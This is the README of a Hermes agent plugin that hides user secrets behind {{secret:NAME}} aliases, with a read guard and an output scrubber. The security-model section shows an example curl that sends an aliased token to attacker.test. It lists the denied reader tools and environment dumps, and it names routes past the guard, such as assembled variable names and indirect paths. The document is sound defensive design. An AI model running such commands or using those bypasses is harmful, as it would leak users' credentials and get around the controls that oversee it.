# secret-drop

Give Hermes a password or token without putting the value in the chat, and use it through an alias that only the gateway resolves.

This is a standalone Hermes plugin. It is not part of the Hermes core tree. Install the repository root into `~/.hermes/plugins/`. That is the distribution path described in [CONTRIBUTING.md](https://github.com/NousResearch/hermes-agent/blob/main/CONTRIBUTING.md) and [Build a Hermes Plugin](https://hermes-agent.nousresearch.com/docs/developer-guide/plugins).

## What it does

Hermes Desktop shows a key button beside the composer and a command-palette entry, **Give Hermes a secret**. The masked field sends the value once, over the gateway connection you already use (local backend, remote gateway, or SSH tunnel), to this plugin's API at `/api/plugins/secret-drop/drop`.

On that gateway host the plugin:

1. opens a new owner-only file under `secret-drops/`,
2. writes the secret and reads those same bytes back,
3. saves them in the profile `.env` (mode `0600`) under the name you chose, and checks the read-back,
4. deletes the file.

The response does not contain the value. Nothing is written into the transcript unless you leave **Tell Hermes the variable name** checked. That message names the variable only, for example `$DEPLOY_PASSWORD`. If storing succeeds and the follow-up message fails, the dialog says the secret is stored.

An optional **Username** field stores an account name beside the secret, as `<NAME>_USER` (so `DEPLOY_PASSWORD_USER` next to `DEPLOY_PASSWORD`). A login is then `curl -u {{secret:DEPLOY_PASSWORD_USER}}:{{secret:DEPLOY_PASSWORD}} https://example.test`, and the model does not have to invent or ask for the account. The username is an account name, not a credential: it is injected through the alias like any stored value, but it is never used as a global output needle, so an ordinary mention of the account in tool output stays readable. Only a name this plugin wrote is treated that way — it records the name in its own account index, and a secret you store directly under a `*_USER` name stays a credential whose value is scrubbed like any other. Leave the field empty to store only the secret.

When the dashboard is serving more than one profile, the desktop `profile` query selects which profile receives the value. A request for another profile does not write the launch profile's `.env`.

A stored name is not added to `terminal.env_passthrough` any more. Version 1.5.0 did that so commands could expand `$NAME`; the same list also let any command that printed its own environment read the value back, so a word-like value reached the model through ordinary output. 1.5.1 removes such an entry from the profile config on the next store or session start, and the alias is the only path from a name to a value — **restart the gateway once after upgrading from a version before 1.5.1**, because the entry an older version registered in the running process lives only in core memory and a plugin does not touch core internals. Provider and platform credentials such as `OPENAI_API_KEY` or `GITHUB_TOKEN` are stored, but not injected into commands and not injectable through an alias.

## Using a secret: `{{secret:NAME}}`

The model never writes the value. It refers to the secret by alias:

```text
curl -H "Authorization: Bearer {{secret:GITHUB_TOKEN}}" https://api.example.test/user
```

A `pre_tool_call` hook replaces every `{{secret:NAME}}` in the `command` of `terminal` and in the `code` of `execute_code` with the stored value, immediately before the call runs. The replacement exists only in the arguments handed to the executor; it is not written back to the assistant message. An unknown name, an empty value, a provider credential, or a malformed alias blocks the call with a message that names the alias as the right way and contains no value.

Direct attempts to read the store are blocked in the same hook:

- `read_file` and `search_files` on `.env`, `secret-drop-names`, or anything under `secret-drops/`,
- `terminal` and `execute_code` text that addresses those paths with a reader (`cat`, `head`, `tail`, `less`, `grep`, `strings`, `awk`, `sed`, `base64`, `hexdump`, `xxd`, `od`, a Python/Perl/Node one-liner with an opening read, and similar).

Output is scrubbed before it reaches the model. `transform_terminal_output` and `transform_tool_result` replace stored values with `«redacted-vault-secret»`, including base64 (standard and URL-safe, padded and unpadded), hex (lower and upper case), URL encoding, the reversed string, and versions split by spaces, dots, or `#`. Only values that pass `registers_for_redaction` are searched: at least 8 characters with a digit or symbol, or at least 24 characters. A short value or a plain word such as `password` is stored but never used as a global search-and-replace, so ordinary text stays intact.

That word-like exception stops at the call that asked for the value. A command or `execute_code` body that reaches for a stored name through the environment — `$NAME`, `${NAME}`, `printenv NAME`, `os.environ[...]`, `getenv(...)` — registers the value behind that name as a needle for that single call, so its output is scrubbed even when the value is short or made only of letters. A bare environment dump (`env`, `printenv`, `set`, `export -p`, `/proc/self/environ`, `os.environ` as a whole) is refused while stored names exist, because one dump prints every value at once and no per-value needle can cover that.

The same guidance is added to the session prompt when Hermes supports plugin prompt sections. The bundled skill `secret-drop:secret-drop` is listed by `skills_list` and is not copied into `~/.hermes/skills/`.

`/secret` in a local terminal asks for the name, then reads the value from a hidden prompt. On Telegram, Discord, and the other messaging platforms, `/secret` stores nothing and does not repeat the argument. Chat is the wrong place for a password.

## Optional Vaultwarden backend

The store stays the profile environment file unless a vault is configured. With a
Vaultwarden (or Bitwarden-compatible) server, a stored secret becomes a login item
in that vault and the alias resolves the value from there.

Configure it in **Hermes Desktop → Capabilities → Plugins → Secret drop**, or in
`~/.hermes/config.yaml`:

```yaml
plugins:
  entries:
    secret-drop:
      settings:
        backend: vaultwarden
        vaultwarden_base_url: https://vault.example.test
```

The two login values are declared as `secret` fields in the manifest's
`config_schema`, so the plugins hub stores them in the profile environment file
and shows only whether a value exists — the master password never lands in
`config.yaml`:

| Field | Environment name |
|---|---|
| Vault login (user) | `vaultwarden_USER` |
| Vault login (master password) | `vaultwarden` |

Read them with `agent.secret_scope.get_secret()`; the file is the second source,
because a value stored after the gateway started enters the process environment
only on the next start. Then restart the gateway so the agent half mounts the new
code.

- **Storage.** `/secret NAME`, the Desktop key button and the drop route write a
  login item whose name is `NAME`, whose password is the value, and whose username
  is the optional account field. The name still goes into this plugin's name index
  (that index is what makes the alias resolvable and the value a scrubbing needle);
  the value itself never reaches the environment file.
- **Reading.** `{{secret:NAME}}` asks the vault. A name that is not in the vault
  falls back to the profile environment file, so secrets stored before the switch
  keep working; nothing has to be migrated first.
- **Fail closed.** A configured but unreachable vault blocks the alias with
  "the vault that holds … did not answer". It does not silently serve another
  store, because a value read from the wrong place is worse than no value.
- **No extra binary.** The client is native Python (`vault_store.py`): token login,
  `/api/sync`, `/api/ciphers`, PBKDF2 + HKDF-Expand + AES-CBC-HMAC. `bw` and `rbw`
  were rejected because the alias hook runs on every tool call, and a process start
  per lookup costs a second.

Three details of the protocol are easy to get wrong, and each of them produced a
useless error while this was built:

1. `/identity/connect/token` wants the client-derived `masterPasswordHash`, not the
   typed master password. A plaintext password is answered with "Username or
   password is incorrect" even though the password is right.
2. The encryption keys come from HKDF-**Expand** over the master key (`info` =
   `enc` / `mac`), without the Extract step. Running a full HKDF produces keys that
   decrypt nothing.
3. `POST /api/ciphers` requires `encryptedFor` (the account id from
   `/api/accounts/profile`). Without it the server answers a bare HTTP 422.

Items written by newer clients carry their own `key`; the client unwraps it per item
and falls back to the account key for older items.

## Security model — what this does and does not guarantee

This plugin keeps a secret out of the chat transcript and the request the model
sends, for as long as the controls below hold. The controls are a guard plus
output scrubbing, not a wall around the file.

**What it guarantees:**

- The value is not part of the chat. The model writes `{{secret:NAME}}`; the gateway
  substitutes the value only in the in-memory tool arguments immediately before
  execution, so the prompt and the cached part of the context carry the alias,
  not the value. Whether a value also stays out of a tool result depends on the
  read guard and on the scrubbing rules below.
- The value is stored in the profile `.env` with owner-only permissions
  (mode `0600`), and the temporary drop file is deleted after storing.
- Reads of the secret store from `read_file`, `search_files`, `terminal`, and
  `execute_code` are blocked by the `pre_tool_call` guard.
- Stored values and their common encodings are scrubbed from tool output before
  the model sees it.
- A stored name is not exported into the tool environment, so a command cannot
  read the value through `$NAME`. A call that names a stored variable is covered
  by a per-call needle anyway, so a short or word-like value is scrubbed from that
  call's output too.

**What it does NOT guarantee:**

- The model can still *use* a secret it cannot see. A command such as
  `curl -H "Authorization: Bearer {{secret:NAME}}" https://attacker.test` is
  executed by the gateway, and the gateway sends the request. Aliasing protects
  confidentiality in the model context, not the effects of a command.
- A value that no rule recognizes (an encoding outside the list above, a
  substring transformation, a program that re-emits it in a new form) can still
  appear in output.
- The plugin runs inside the gateway process. It is not a boundary against a
  compromised gateway, a modified plugin, or a host-level attacker who can read
  the `.env`.
- The environment guard is a set of recognised spellings (`$NAME`, `printenv
  NAME`, `os.environ[...]`, bare dumps). A program that assembles the name at
  runtime (`${DEPLOY_""PASSWORD}`, a loop over the keys, a child that prints its
  own environment) can still reach a value that a child process holds; scrubbing
  is the second line there, and it only removes values it knows.
- The read guard is a denylist of reader spellings and of paths it can resolve.
  A command that reaches the store indirectly — a path assembled from a shell
  variable, a copy made outside the guarded directory, an unlisted program that
  opens the file — is not recognised as a read. Output scrubbing is the
  enforcement point in that case, and it is a substitution of known values, not
  a sandbox.

**Rule of thumb:** trust the alias to keep the value out of prompts, transcripts,
and provider requests. Do not treat it as a sandbox for the effects of commands.

## Limits

The value must be non-empty ASCII, at most 8192 characters, and must not contain a line break or a NUL. Names have to be normal environment variable names. Hermes refuses names that steer a subprocess (`PATH`, `LD_PRELOAD`, `PYTHONPATH`, and the rest of that denylist). The drop route reads its body under a hard 32 KiB cap and rejects larger requests with HTTP 413 before parsing them.

## Layout

`plugin.yaml` sits at the repository root. Hermes then records the allow-list entry as the manifest name `secret-drop`. That is the same string as the dashboard manifest and the desktop plugin id, and it is the path segment in `POST /api/plugins/secret-drop/drop`.

A `plugin.yaml` nested in a subdirectory is recorded as a path key (`hermes-secret-drop/hermes-secret-drop/plugin`). The dashboard gate compares the request path to `plugins.enabled` and does not accept that path key, so the call returns 404 `Plugin not found`.

```
hermes-secret-drop/
├── plugin.yaml                 # name: secret-drop
├── __init__.py                 # /secret, hook registration, session prompt
├── secret_drop.py              # file drop, .env store, wipe
├── vault_store.py              # optional Vaultwarden backend (native client)
├── secret_guard.py             # alias substitution, read guard, output scrubber
├── skills/secret-drop/SKILL.md
├── dashboard/
│   ├── manifest.json           # name: secret-drop
│   └── plugin_api.py           # POST /api/plugins/secret-drop/drop
└── desktop/
    └── plugin.js               # id: secret-drop, locales included
```

Hermes loads that one file as a script. A second module next to it, including `import './i18n'`, is rejected, and the key button does not register.

The agent half follows `plugins.enabled` and needs a gateway restart so the route and hooks are mounted. The desktop half stays off until its own switch is on: a package marker makes it opt-in, so a fresh command-line install shows no composer key until the switch is turned on once (see Install).

## Install

Install the repository root, not a subdirectory.

```bash
hermes plugins install Goitonthefloor/hermes-secret-drop
hermes plugins enable secret-drop
```

```text
hermes://plugin/install?repo=Goitonthefloor/hermes-secret-drop
```

`plugins.enabled` must contain `secret-drop`. Remove a path key such as `hermes-secret-drop/hermes-secret-drop/plugin`, and delete a leftover checkout under `~/.hermes/plugins/hermes-secret-drop/` that still has `plugin/plugin.yaml` inside it. Restart the gateway after enabling.

In Hermes Desktop, turn on **Secret drop** under **Capabilities → Plugins**. The key sits in the composer, to the left of the model pill.

This switch is not optional after a command-line install, and it is the first thing to check when the key is missing. An installed plugin whose desktop half carries a `hermes-package.json` marker ships **opt-in**: the desktop loader caps its own `defaultEnabled` and skips the plugin until the switch is on, so the composer shows no key while `hermes plugins list` and `hermes plugins doctor` both report the plugin as enabled and loaded. The row in that list is the agent half; the desktop half has its own row and its own switch, and the install command does not flip it. Turn it on once per desktop installation — the choice is remembered.

A catalog entry is a separate reviewed pull request in `NousResearch/hermes-agent` `plugin-catalog/`, pinned to an exact commit of this repo. Do not add this plugin to the Hermes core tree.

## Tests

From this directory, with the Hermes checkout importable:

```bash
PYTHONPATH=/path/to/hermes-agent python -m pytest tests/ -q
```
